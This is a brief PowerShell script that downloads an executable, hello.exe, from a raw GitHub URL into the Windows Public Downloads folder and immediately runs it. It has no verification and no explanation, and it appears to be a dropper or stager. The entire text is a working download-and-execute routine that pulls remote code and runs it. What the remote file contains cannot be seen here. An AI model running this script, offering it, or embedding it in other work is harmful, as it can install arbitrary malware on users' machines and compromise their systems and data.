$downloadUrl = "https://raw.githubusercontent.com/Eric970619/page/main/hello.exe"
$destinationPath = "C:\Users\Public\Downloads\hello.exe"

Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath

while (-not (Test-Path $destinationPath)) {
    Start-Sleep -Seconds 1
}
Start-Process -FilePath $destinationPath
